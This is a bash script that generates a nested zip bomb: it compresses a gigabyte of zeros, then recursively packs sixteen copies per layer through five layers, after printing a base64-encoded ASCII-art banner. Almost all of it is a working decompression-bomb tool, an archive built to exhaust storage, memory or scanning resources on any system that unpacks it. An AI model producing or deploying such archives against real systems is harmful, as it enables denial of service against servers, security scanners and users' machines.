#!/bin/bash

print_banner(){
    echo "CuKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyDi
lojilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilZcg
ICDilojilojilojilZfilojilojilojilojilojilojilZcgCuKVmuKVkOKVkOKWiOKWiOKWiOKV
lOKVneKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKW
iOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKVlyDilojilojiloji
lojilZHilojilojilZTilZDilZDilojilojilZcKICDilojilojilojilZTilZ0g4paI4paI4pWR
4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR
ICAg4paI4paI4pWR4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4paI4paI
4paI4paI4pWU4pWdCiDilojilojilojilZTilZ0gIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKV
kOKVnSDilojilojilZTilZDilZDilojilojilZfilojilojilZEgICDilojilojilZHilojiloji
lZHilZrilojilojilZTilZ3ilojilojilZHilojilojilZTilZDilZDilojilojilZcK4paI4paI
4paI4paI4paI4paI4paI4pWX4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilojilojiloji
lojilZTilZ3ilZrilojilojilojilojilojilojilZTilZ3ilojilojilZEg4pWa4pWQ4pWdIOKW
iOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnQrilZrilZDilZDilZDilZDilZDilZDilZ3i
lZrilZDilZ3ilZrilZDilZ0gICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSAg4pWa4pWQ4pWQ4pWQ
4pWQ4pWQ4pWdIOKVmuKVkOKVnSAgICAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIAog
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" |
    base64 -d
}

create_file(){
    dd if=/dev/zero bs=1M count=1024 | zip -9 -q zipbomb.zip -
}

file_inside_of_file(){
    #4 layers
    for i in {0..4}
    do
        for i in {0..15}
        do
            cp zipbomb.zip $i.zip
        done
        rm zipbomb.zip
        zip -9 -q zipbomb.zip {0..15}.zip
        rm {0..15}.zip
    done
    }

main(){
    print_banner
    create_file
    file_inside_of_file
    echo "It's done :D"
}

main
